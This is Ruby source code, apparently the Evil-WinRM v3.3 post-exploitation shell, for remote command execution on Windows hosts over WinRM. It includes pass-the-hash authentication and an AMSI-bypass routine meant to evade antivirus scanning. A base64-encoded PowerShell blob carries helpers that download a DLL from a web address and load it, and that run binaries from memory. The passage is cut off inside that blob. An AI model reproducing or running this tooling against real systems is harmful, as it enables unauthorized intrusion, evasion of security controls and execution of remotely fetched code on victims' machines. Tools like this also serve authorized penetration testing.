#!/usr/bin/env ruby
# -*- encoding : utf-8 -*-
# Author: CyberVaca
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

# Dependencies
require 'winrm'
require 'winrm-fs'
require 'stringio'
require 'base64'
require 'readline'
require 'optionparser'
require 'io/console'
require 'time'
require 'fileutils'
require 'logger'

# Constants

# Version
VERSION = '3.3'

# Msg types
TYPE_INFO = 0
TYPE_ERROR = 1
TYPE_WARNING = 2
TYPE_DATA = 3
TYPE_SUCCESS = 4

# Global vars

# Global vars

# Available commands
$LIST = ['Bypass-4MSI', 'services', 'upload', 'download', 'menu', 'exit']
$COMMANDS = $LIST.dup
$CMDS = $COMMANDS.clone
$LISTASSEM = [''].sort
$DONUTPARAM1 = ['-process_id']
$DONUTPARAM2 = ['-donutfile']

# Colors and path completion
$colors_enabled = true
$check_rpath_completion = true

# Path for ps1 scripts and exec files
$scripts_path = ""
$executables_path = ""

# Connection vars initialization
$host = ""
$port = "5985"
$user = ""
$password = ""
$url = "wsman"
$default_service = "HTTP"
$full_logging_path = ENV["HOME"]+"/evil-winrm-logs"

# Redefine download method from winrm-fs
module WinRM
    module FS
        class FileManager
            def download(remote_path, local_path, chunk_size = 1024 * 1024, first = true, size: -1)
                @logger.debug("downloading: #{remote_path} -> #{local_path} #{chunk_size}")
                index = 0
                output = _output_from_file(remote_path, chunk_size, index)
                return download_dir(remote_path, local_path, chunk_size, first) if output.exitcode == 2

                return false if output.exitcode >= 1

                File.open(local_path, 'wb') do |fd|
                    out = _write_file(fd, output)
                    index += out.length
                    until out.empty?
                        if size != -1
                            yield index, size
                        end
                        output = _output_from_file(remote_path, chunk_size, index)
                        return false if output.exitcode >= 1

                        out = _write_file(fd, output)
                        index += out.length
                    end
                end
            end

            true
        end
    end
end

# Class creation
class EvilWinRM

    # Initialization
    def initialize()
        @directories = Hash.new
        @cache_ttl = 10
        @executables = Array.new
        @functions = Array.new
        @Bypass_4MSI_loaded = false
        @bypass_amsi_words_random_case = [
            "[Runtime.InteropServices.Marshal]",
            "function ",
            "WriteByte",
            "[Ref]",
            "Assembly.GetType",
            "GetField",
            "[System.Net.WebUtility]",
            "HtmlDecode",
            "Reflection.BindingFlags",
            "NonPublic",
            "Static",
            "GetValue",
        ]
    end

    # Remote path completion compatibility check
    def completion_check()
        if $check_rpath_completion == true then
             begin
                 Readline.quoting_detection_proc
                    @completion_enabled = true
                rescue NotImplementedError => err
                    @completion_enabled = false
                    self.print_message("Remote path completions is disabled due to ruby limitation: #{err.to_s}", TYPE_WARNING)
                    self.print_message("For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion", TYPE_DATA)
                end
        else
            @completion_enabled = false
            self.print_message("Remote path completion is disabled", TYPE_WARNING)
        end

    end

    # Arguments
    def arguments()
        options = { port:$port, url:$url, service:$service }
        optparse = OptionParser.new do |opts|
            opts.banner = "Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]"
            opts.on("-S", "--ssl", "Enable ssl") do |val|
                $ssl = true
                options[:port] = "5986"
            end
            opts.on("-c", "--pub-key PUBLIC_KEY_PATH", "Local path to public key certificate") { |val| options[:pub_key] = val }
            opts.on("-k", "--priv-key PRIVATE_KEY_PATH", "Local path to private key certificate") { |val| options[:priv_key] = val }
            opts.on("-r", "--realm DOMAIN", "Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }") { |val| options[:realm] = val.upcase }
            opts.on("-s", "--scripts PS_SCRIPTS_PATH", "Powershell scripts local path") { |val| options[:scripts] = val }
            opts.on("--spn SPN_PREFIX", "SPN prefix for Kerberos auth (default HTTP)") { |val| options[:service] = val }
            opts.on("-e", "--executables EXES_PATH", "C# executables local path") { |val| options[:executables] = val }
            opts.on("-i", "--ip IP", "Remote host IP or hostname. FQDN for Kerberos auth (required)") { |val| options[:ip] = val }
            opts.on("-U", "--url URL", "Remote url endpoint (default /wsman)") { |val| options[:url] = val }
            opts.on("-u", "--user USER", "Username (required if not using kerberos)") { |val| options[:user] = val }
            opts.on("-p", "--password PASS", "Password") { |val| options[:password] = val }
            opts.on("-H", "--hash HASH", "NTHash") do |val|
                if !options[:password].nil? and !val.nil?
                    self.print_header()
                    self.print_message("You must choose either password or hash auth. Both at the same time are not allowed", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                if !val.match /^[a-fA-F0-9]{32}$/
                    self.print_header()
                    self.print_message("Invalid hash format", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                options[:password] = "00000000000000000000000000000000:#{val}"
            end
            opts.on("-P", "--port PORT", "Remote host port (default 5985)") { |val| options[:port] = val }
            opts.on("-V", "--version", "Show version") do |val|
                puts("v#{VERSION}")
                self.custom_exit(0, false)
            end
            opts.on("-n", "--no-colors", "Disable colors") do |val|
                $colors_enabled = false
            end
            opts.on("-N", "--no-rpath-completion", "Disable remote path completion") do |val|
                $check_rpath_completion = false
            end
            opts.on("-l","--log","Log the WinRM session") do|val|
                $log = true
                $filepath = ""
                $logfile = ""
                $logger = ""
            end
            opts.on("-h", "--help", "Display this help message") do
                self.print_header()
                puts(opts)
                puts()
                self.custom_exit(0, false)
            end
        end

        begin
            optparse.parse!
        if options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil? then
            mandatory = [:ip, :user]
        else
            mandatory = [:ip]
        end
            missing = mandatory.select{ |param| options[param].nil? }
            unless missing.empty?
                raise OptionParser::MissingArgument.new(missing.join(', '))
            end
        rescue OptionParser::InvalidOption, OptionParser::MissingArgument
            self.print_header()
            self.print_message($!.to_s, TYPE_ERROR, true, $logger)
            puts(optparse)
            puts()
            custom_exit(1, false)
        end

        if options[:password].nil? and options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil?
            options[:password] = STDIN.getpass(prompt='Enter Password: ')
        end

        $host = options[:ip]
        $user = options[:user]
        $password = options[:password]
        $port = options[:port]
        $scripts_path = options[:scripts]
        $executables_path = options[:executables]
        $url = options[:url]
        $pub_key = options[:pub_key]
        $priv_key = options[:priv_key]
        $realm = options[:realm]
        $service = options[:service]
        if !$log.nil? then
            if !Dir.exists?($full_logging_path)
                Dir.mkdir $full_logging_path
            end
            if !Dir.exists?($full_logging_path + "/" + Time.now.strftime("%Y%d%m"))
                Dir.mkdir $full_logging_path + "/" + Time.now.strftime("%Y%d%m")
            end
            if !Dir.exists?($full_logging_path + "/" + Time.now.strftime("%Y%d%m") + "/" + $host)
                Dir.mkdir $full_logging_path+ "/" + Time.now.strftime("%Y%d%m") + "/" + $host
            end
            $filepath = $full_logging_path + "/" + Time.now.strftime("%Y%d%m") + "/" + $host + "/" + Time.now.strftime("%H%M%S")
            $logger = Logger.new($filepath)
            $logger.formatter = proc do |severity, datetime, progname, msg|
                "#{datetime}: #{msg}\n"
            end
        end
        if !$realm.nil? then
            if $service.nil? then
                $service = $default_service
            end
        end
    end

    # Print script header
    def print_header()
         puts()
         self.print_message("Evil-WinRM shell v#{VERSION}", TYPE_INFO, false)
     end

    # Generate connection object
    def connection_initialization()
        if $ssl then
            if $pub_key and $priv_key then
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl,
                    client_cert: $pub_key,
                    client_key: $priv_key,
                )
            else
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl
                )
            end

        elsif !$realm.nil? then
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: "",
                password: "",
                transport: :kerberos,
                realm: $realm,
                service: $service
            )
        else
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: $user,
                password: $password,
                :no_ssl_peer_verification => true
            )
        end
    end

    # Detect if a docker environment
    def docker_detection()
        if File.exist?("/.dockerenv") then
            return true
        else
            return false
        end
    end

    # Define colors
    def colorize(text, color = "default")
        colors = {"default" => "38", "blue" => "34", "red" => "31", "yellow" => "1;33", "magenta" => "35", "green" => "1;32"}
        color_code = colors[color]
        return "\001\033[0;#{color_code}m\002#{text}\001\033[0m\002"
    end

    # Messsage printing
    def print_message(msg, msg_type=TYPE_INFO, prefix_print=true, log=nil)
        if msg_type == TYPE_INFO then
            msg_prefix = "Info: "
            color = "blue"
        elsif msg_type == TYPE_WARNING then
            msg_prefix = "Warning: "
            color = "yellow"
        elsif msg_type == TYPE_ERROR then
            msg_prefix = "Error: "
            color = "red"
        elsif msg_type == TYPE_DATA then
            msg_prefix = "Data: "
            color = 'magenta'
        elsif msg_type == TYPE_SUCCESS then
            color = 'green'
        else
            msg_prefix = ""
            color = "default"
        end

        if !prefix_print then
            msg_prefix = ""
        end
        if $colors_enabled then
            puts(self.colorize("#{msg_prefix}#{msg}", color))
        else
            puts("#{msg_prefix}#{msg}")
        end

        if !log.nil?
            log.info("#{msg_prefix}#{msg}")
        end
        puts()
    end

    # Certificates validation
    def check_certs(pub_key, priv_key)
         if !File.file?(pub_key) then
            self.print_message("Path to provided public certificate file \"#{pub_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if !File.file?($priv_key) then
            self.print_message("Path to provided private certificate file \"#{priv_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end
    end

    # Directories validation
    def check_directories(path, purpose)
        if path == "" then
            self.print_message("The directory used for #{purpose} can't be empty. Please set a path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if !(/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM).nil? then
            # Windows
            if path[-1] != "\\" then
                path.concat("\\")
            end
        else
            # Unix
            if path[-1] != "/" then
                path.concat("/")
            end
        end

        if !File.directory?(path) then
            self.print_message("The directory \"#{path}\" used for #{purpose} was not found", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if purpose == "scripts" then
            $scripts_path = path
        elsif purpose == "executables" then
            $executables_path = path
        end
    end

    # Silent warnings
    def silent_warnings
        old_stderr = $stderr
        $stderr = StringIO.new
        yield
    ensure
        $stderr = old_stderr
    end

    # Read powershell script files
    def read_scripts(scripts)
        files = Dir.entries(scripts).select{ |f| File.file? File.join(scripts, f) } || []
        return files.grep(/^*\.(ps1|psd1|psm1)$/)
    end

    # Read executable files
    def read_executables(executables)
        files = Dir.glob("#{executables}*.exe", File::FNM_DOTMATCH)
        return files
    end

    # Read local files and directories names
    def paths(a_path)
        parts = self.get_dir_parts(a_path)
        my_dir = parts[0]
        grep_for = parts[1]

        my_dir = File.expand_path(my_dir)
        my_dir = my_dir + "/" unless my_dir[-1] == '/'

        files = Dir.glob("#{my_dir}*", File::FNM_DOTMATCH)
        directories = Dir.glob("#{my_dir}*").select {|f| File.directory? f}

        result = files + directories || []

        result.grep( /^#{Regexp.escape(my_dir)}#{grep_for}/i ).uniq
    end

    # Custom exit
    def custom_exit(exit_code = 0, message_print=true)
        if message_print then
            if exit_code == 0 then
                puts()
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_INFO, true, $logger)
            elsif exit_code == 1 then
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR, true, $logger)
            elsif exit_code == 130 then
                puts()
                self.print_message("Exiting...", TYPE_INFO, true, $logger)
            else
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR, true, $logger)
            end
        end
        exit(exit_code)
    end

    # Progress bar
    def progress_bar(bytes_done, total_bytes)
        progress = ((bytes_done.to_f / total_bytes.to_f) * 100).round
        progress_bar = (progress / 10).round
        progress_string = "▓" * (progress_bar-1).clamp(0,9)
        progress_string = progress_string + "▒" + ("░" * (10-progress_bar))
        message = "Progress: #{progress}% : |#{progress_string}|          \r"
        print message
    end

    # Get filesize
    def filesize(shell, path)
        size = shell.run("(get-item '#{path}').length").output.strip.to_i
        return size
    end

    # Main function
    def main
        self.arguments()
        self.connection_initialization()
        file_manager = WinRM::FS::FileManager.new($conn)
        self.print_header()
        self.completion_check()

        # Log check
        if !$log.nil? then
            self.print_message("Logging Enabled. Log file: #{$filepath}", TYPE_WARNING, true)
        end

        # SSL checks
        if !$ssl and ($pub_key or $priv_key) then
            self.print_message("Useless cert/s provided, SSL is not enabled", TYPE_WARNING, true, $logger)
        elsif $ssl
            self.print_message("SSL enabled", TYPE_WARNING)
        end

        if $ssl and ($pub_key or $priv_key) then
            self.check_certs($pub_key, $priv_key)
        end

        # Kerberos checks
         if !$user.nil? and !$realm.nil?
            self.print_message("User is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING, true, $logger)
        end

        if !$password.nil? and !$realm.nil?
            self.print_message("Password is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING, true, $logger)
        end

        if $realm.nil? and !$service.nil? then
            self.print_message("Useless spn provided, only used for Kerberos auth", TYPE_WARNING, true, $logger)
        end

        if !$scripts_path.nil? then
            self.check_directories($scripts_path, "scripts")
            @functions = self.read_scripts($scripts_path)
            self.silent_warnings do
                $LIST = $LIST + @functions
            end
        end

        if !$executables_path.nil? then
            self.check_directories($executables_path, "executables")
            @executables = self.read_executables($executables_path)
        end
        menu = Base64.decode64("JG1lbnUgPSBAIgoKICAgLC4gICAoICAgLiAgICAgICkgICAgICAgICAgICAgICAiICAgICAgICAgICAgLC4gICAoICAgLiAgICAgICkgICAgICAgLiAgIAogICgiICAoICApICApJyAgICAgLCcgICAgICAgICAgICAgKGAgICAgICdgICAgICgiICAgICApICApJyAgICAgLCcgICAuICAsKSAgCi47ICkgICcgKCggKCIgKSAgICA7KCwgICAgICAuICAgICA7KSAgIiAgKSIgIC47ICkgICcgKCggKCIgKSAgICk7KCwgICApKCggICAKXyIuLF8sLl9fKS4sKSAoLi5fKCAuXyksICAgICApICAsICguXy4uKCAnLi5fIi5fLCAuICcuXylfKC4uLF8oXyIuKSBfKCBfJykgIApcXyAgIF9fX19fL19fICBffF9ffCAgfCAgICAoKCAgKCAgLyAgXCAgICAvICBcX198IF9fX19cX19fX19fICAgXCAgLyAgICAgXCAgCiB8ICAgIF9fKV9cICBcLyAvICB8ICB8ICAgIDtfKV8nKSBcICAgXC9cLyAgIC8gIHwvICAgIFx8ICAgICAgIF8vIC8gIFwgLyAgXCAKIHwgICAgICAgIFxcICAgL3wgIHwgIHxfXyAvX19fX18vICBcICAgICAgICAvfCAgfCAgIHwgIFwgICAgfCAgIFwvICAgIFkgICAgXAovX19fX19fXyAgLyBcXy8gfF9ffF9fX18vICAgICAgICAgICBcX18vXCAgLyB8X198X19ffCAgL19fX198XyAgL1xfX19ffF9fICAvCiAgICAgICAgXC8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXC8gICAgICAgICAgXC8gICAgICAgXC8gICAgICAgICBcLwoKICAgICAgIEJ5OiBDeWJlclZhY2EsIE9zY2FyQWthRWx2aXMsIEphcmlsYW9zLCBBcmFsZTYxIEBIYWNrcGxheWVycwoiQAoKaWYgKCRmdW5jaW9uZXNfcHJldmlhcy5jb3VudCAtbGUgMSkgeyRmdW5jaW9uZXNfcHJldmlhcyA9IChscyBmdW5jdGlvbjopLk5hbWV9CmZ1bmN0aW9uIG1lbnUgewpbYXJyYXldJGZ1bmNpb25lc19udWV2YXMgPSAobHMgZnVuY3Rpb246IHwgV2hlcmUtT2JqZWN0IHsoJF8ubmFtZSkuTGVuZ3RoIC1nZSAiNCIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDbGVhci1Ib3N0KiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDb252ZXJ0RnJvbS1TZGRsU3RyaW5nKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJGb3JtYXQtSGV4KiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJHZXQtRmlsZUhhc2gqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkdldC1WZXJiKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJoZWxwIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkltcG9ydC1Qb3dlclNoZWxsRGF0YUZpbGUqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkltcG9ydFN5c3RlbU1vZHVsZXMqIiAtYW5kICRfLm5hbWUgLW5lICJNYWluIiAtYW5kICRfLm5hbWUgLW5lICJta2RpciIgLWFuZCAkXy5uYW1lIC1uZSAiY2QuLiIgLWFuZCAkXy5uYW1lIC1uZSAibWtkaXIiIC1hbmQgJF8ubmFtZSAtbmUgIm1vcmUiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiTmV3LUd1aWQqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIk5ldy1UZW1wb3JhcnlGaWxlKiIgLWFuZCAkXy5uYW1lIC1uZSAiUGF1c2UiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiVGFiRXhwYW5zaW9uMioiIC1hbmQgJF8ubmFtZSAtbmUgInByb21wdCIgLWFuZCAkXy5uYW1lIC1uZSAibWVudSIgLWFuZCAkXy5uYW1lIC1uZSAiYXV0byIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJzaG93LW1ldGhvZHMtbG9hZGVkKiIgfSB8IHNlbGVjdC1vYmplY3QgbmFtZSApLm5hbWUKJG11ZXN0cmFfZnVuY2lvbmVzID0gKCRmdW5jaW9uZXNfbnVldmFzIHwgd2hlcmUgeyRmdW5jaW9uZXNfcHJlY2FyZ2FkYXMgLW5vdGNvbnRhaW5zICRffSkgfCBmb3JlYWNoIHsiYG5bK10gJF8ifQokbXVlc3RyYV9mdW5jaW9uZXMgPSAkbXVlc3RyYV9mdW5jaW9uZXMgLXJlcGxhY2UgIiAgIiwiIiAKJG1lbnUgPSAkbWVudSArICRtdWVzdHJhX2Z1bmNpb25lcyArICJgbiIKJG1lbnUgPSAkbWVudSAtcmVwbGFjZSAiIFsrXSIsIlsrXSIKV3JpdGUtSG9zdCAkbWVudQoKfQoKZnVuY3Rpb24gRGxsLUxvYWRlciB7CiAgICBwYXJhbShbc3dpdGNoXSRzbWIsIFtzd2l0Y2hdJGxvY2FsLCBbc3dpdGNoXSRodHRwLCBbc3RyaW5nXSRwYXRoKQoKICAgICRoZWxwPUAiCi5TWU5PUFNJUwogICAgZGxsIGxvYWRlci4KICAgIFBvd2VyU2hlbGwgRnVuY3Rpb246IERsbC1Mb2FkZXIKICAgIEF1dGhvcjogSGVjdG9yIGRlIEFybWFzICgzdjRTaTBOKQoKICAgIFJlcXVpcmVkIGRlcGVuZGVuY2llczogTm9uZQogICAgT3B0aW9uYWwgZGVwZW5kZW5jaWVzOiBOb25lCi5ERVNDUklQVElPTgogICAgLgouRVhBTVBMRQogICAgRGxsLUxvYWRlciAtc21iIC1wYXRoIFxcMTkyLjE2OC4xMzkuMTMyXFxzaGFyZVxcbXlEbGwuZGxsCiAgICBEbGwtTG9hZGVyIC1sb2NhbCAtcGF0aCBDOlxVc2Vyc1xQZXBpdG9cRGVza3RvcFxteURsbC5kbGwKICAgIERsbC1Mb2FkZXIgLWh0dHAgLXBhdGggaHR0cDovL2V4YW1wbGUuY29tL215RGxsLmRsbAoKICAgIERlc2NyaXB0aW9uCiAgICAtLS0tLS0tLS0tLQogICAgRnVuY3Rpb24gdGhhdCBsb2FkcyBhbiBhcmJpdHJhcnkgZGxsCiJACgogICAgaWYgKCgkc21iIC1lcSAkZmFsc2UgLWFuZCAkbG9jYWwgLWVxICRmYWxzZSAtYW5kICRodHRwIC1lcSAkZmFsc2UpIC1vciAoJHBhdGggLWVxICIiIC1vciAkcGF0aCAtZXEgJG51bGwpKQogICAgewogICAgICAgIHdyaXRlLWhvc3QgIiRoZWxwYG4iCiAgICB9CiAgICBlbHNlCiAgICB7CgogICAgICAgIGlmICgkaHR0cCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBSZWFkaW5nIGRsbCBieSBIVFRQIgogICAgICAgICAgICAkd2ViY2xpZW50ID0gW1N5c3RlbS5OZXQuV2ViQ2xpZW50XTo6bmV3KCkKICAgICAgICAgICAgJGRsbCA9ICR3ZWJjbGllbnQuRG93bmxvYWREYXRhKCRwYXRoKQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZigkc21iKXsgV3JpdGUtSG9zdCAiWytdIFJlYWRpbmcgZGxsIGJ5IFNNQiIgfQogICAgICAgICAgICBlbHNlIHsgV3JpdGUtSG9zdCAiWytdIFJlYWRpbmcgZGxsIGxvY2FsbHkiIH0KCiAgICAgICAgICAgICRkbGwgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJHBhdGgpCiAgICAgICAgfQogICAgICAgIAoKICAgICAgICBpZiAoJGRsbCAtbmUgJG51bGwpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1Ib3N0ICJbK10gTG9hZGluZyBkbGwuLi4iCiAgICAgICAgICAgICRhc3NlbWJseV9sb2FkZWQgPSBbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKCRkbGwpCiAgICAgICAgICAgICRvYmogPSAoKCRhc3NlbWJseV9sb2FkZWQuR2V0RXhwb3J0ZWRUeXBlcygpIHwgU2VsZWN0LU9iamVjdCBEZWNsYXJlZE1ldGhvZHMgKS5EZWNsYXJlZE1ldGhvZHMgfCBXaGVyZS1PYmplY3QgeyRfLmlzcHVibGljIC1lcSAkdHJ1ZX0gfCBTZWxlY3QtT2JqZWN0IERlY2xhcmluZ1R5cGUsbmFtZSAtVW5pcXVlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlICkKICAgICAgICAgICAgW2FycmF5XSRtZXRob2RzID0gZm9yZWFjaCAoJGFzc2VtYmx5cHJvcGVydGllcyBpbiAkb2JqKSB7ICRuYW1lc3BhY2UgPSAkYXNzZW1ibHlwcm9wZXJ0aWVzLkRlY2xhcmluZ1R5cGUudG9zdHJpbmcoKTsgJG1ldG9kbyA9ICRhc3NlbWJseXByb3BlcnRpZXMubmFtZS50b3N0cmluZygpOyAiWyIgKyAkbmFtZXNwYWNlICsgIl0iICsgIjo6IiArICRtZXRvZG8gKyAiKCkiIH0KICAgICAgICAgICAgJG1ldGhvZHMgPSAkbWV0aG9kcyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSA7ICRnbG9iYWw6c2hvd21ldGhvZHMgPSAgICgkbWV0aG9kc3wgd2hlcmUgeyAkZ2xvYmFsOnNob3dtZXRob2RzICAtbm90Y29udGFpbnMgJF99KSB8IGZvcmVhY2ggeyIkX2BuIn0KICAgICAgICAgICAgCiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBhdXRvIHsKW2FycmF5XSRmdW5jaW9uZXNfbnVldmFzID0gKGxzIGZ1bmN0aW9uOiB8IFdoZXJlLU9iamVjdCB7KCRfLm5hbWUpLkxlbmd0aCAtZ2UgIjQiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiQ2xlYXItSG9zdCoiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiQ29udmVydEZyb20tU2RkbFN0cmluZyIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJGb3JtYXQtSGV4IiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkdldC1GaWxlSGFzaCoiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiR2V0LVZlcmIqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgImhlbHAiIC1hbmQgJF8ubmFtZSAtbmUgIkltcG9ydC1Qb3dlclNoZWxsRGF0YUZpbGUiIC1hbmQgJF8ubmFtZSAtbmUgIkltcG9ydFN5c3RlbU1vZHVsZXMiIC1hbmQgJF8ubmFtZSAtbmUgIk1haW4iIC1hbmQgJF8ubmFtZSAtbmUgIm1rZGlyIiAtYW5kICRfLm5hbWUgLW5lICJjZC4uIiAtYW5kICRfLm5hbWUgLW5lICJta2RpciIgLWFuZCAkXy5uYW1lIC1uZSAibW9yZSIgLWFuZCAkXy5uYW1lIC1uZSAiTmV3LUd1aWQiIC1hbmQgJF8ubmFtZSAtbmUgIk5ldy1UZW1wb3JhcnlGaWxlIiAtYW5kICRfLm5hbWUgLW5lICJQYXVzZSIgLWFuZCAkXy5uYW1lIC1uZSAiVGFiRXhwYW5zaW9uMiIgLWFuZCAkXy5uYW1lIC1uZSAicHJvbXB0IiAtYW5kICRfLm5hbWUgLW5lICJtZW51IiAtYW5kICRfLm5hbWUgLW5lICJzaG93LW1ldGhvZHMtbG9hZGVkIn0gfCBzZWxlY3Qtb2JqZWN0IG5hbWUgKS5uYW1lCiRtdWVzdHJhX2Z1bmNpb25lcyA9ICgkZnVuY2lvbmVzX251ZXZhcyB8IHdoZXJlIHskZnVuY2lvbmVzX3ByZWNhcmdhZGFzIC1ub3Rjb250YWlucyAkX30pIHwgZm9yZWFjaCB7IiRfYG4ifQokbXVlc3RyYV9mdW5jaW9uZXMgPSAkbXVlc3RyYV9mdW5jaW9uZXMgLXJlcGxhY2UgIiAgIiwiIiAKJG11ZXN0cmFfZnVuY2lvbmVzCgoKfQpmdW5jdGlvbiBJbnZva2UtQmluYXJ5IHtwYXJhbSgkYXJnKQogICAgJGhlbHA9QCIKLlNZTk9QU0lTCiAgICBFeGVjdXRlIGJpbmFyaWVzIGZyb20gbWVtb3J5LgogICAgUG93ZXJTaGVsbCBGdW5jdGlvbjogSW52b2tlLUJpbmFyeQogICAgQXV0aG9yOiBMdWlzIFZhY2FzIChDeWJlclZhY2EpCgogICAgUmVxdWlyZWQgZGVwZW5kZW5jaWVzOiBOb25lCiAgICBPcHRpb25hbCBkZXBlbmRlbmNpZXM6IE5vbmUKLkRFU0NSSVBUSU9OCiAgICAKLkVYQU1QTEUKICAgIEludm9rZS1CaW5hcnkgL29wdC9jc2hhcnAvV2F0c29uLmV4ZQogICAgSW52b2tlLUJpbmFyeSAvb3B0L2NzaGFycC9CaW5hcnkuZXhlIHBhcmFtMSxwYXJhbTIscGFyYW0zCiAgICBJbnZva2UtQmluYXJ5IC9vcHQvY3NoYXJwL0JpbmFyeS5leGUgJ3BhcmFtMSwgcGFyYW0yLCBwYXJhbTMnCiAgICBEZXNjcmlwdGlvbgogICAgLS0tLS0tLS0tLS0KICAgIEZ1bmN0aW9uIHRoYXQgZXhlY3V0ZSBiaW5hcmllcyBmcm9tIG1lbW9yeS4KCgoiQAppZiAoJGFyZyAtZXEgJG51bGwpIHskaGVscH0gZWxzZSB7CltSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZChbYnl0ZVtdXUAoNzcsIDkwLCAxNDQsIDAsIDMsIDAsIDAsIDAsIDQsIDAsIDAsIDAsIDI1NSwgMjU1LCAwLCAwLCAxODQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxMjgsIDAsIDAsIDAsIDE0LCAzMSwgMTg2LCAxNCwgMCwgMTgwLCA5LCAyMDUsIDMzLCAxODQsIDEsIDc2LCAyMDUsIDMzLCA4NCwgMTA0LCAxMDUsIDExNSwgMzIsIDExMiwgMTE0LCAxMTEsIDEwMywgMTE0LCA5NywgMTA5LCAzMiwgOTksIDk3LCAxMTAsIDExMCwgMTExLCAxMTYsIDMyLCA5OCwgMTAxLCAzMiwgMTE0LCAxMTcsIDExMCwgMzIsIDEwNSwgMTEwLCAzMiwgNjgsIDc5LCA4MywgMzIsIDEwOSwgMTExLCAxMDAsIDEwMSwgNDYsIDEzLCAxMywgMTAsIDM2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA4MCwgNjksIDAsIDAsIDc2LCAxLCAzLCAwLCAyNDUsIDE4MiwgMjMxLCA5MiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMjI0LCAwLCAyLCAzMywgMTEsIDEsIDExLCAwLCAwLCAxMCwgMCwgMCwgMCwgNiwgMCwgMCwgMCwgMCwgMCwgMCwgOTQsIDQxLCAwLCAwLCAwLCAzMiwgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDE2LCAwLCAzMiwgMCwgMCwgMCwgMiwgMCwgMCwgNCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTI4LCAwLCAwLCAwLCAyLCAwLCAwLCAwLCAwLCAwLCAwLCAzLCAwLCA5NiwgMTMzLCAwLCAwLCAxNiwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDE2LCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEyLCA0MSwgMCwgMCwgNzksIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCA0MCwgMywgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgOTYsIDAsIDAsIDEyLCAwLCAwLCAwLCAyMTIsIDM5LCAwLCAwLCAyOCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMC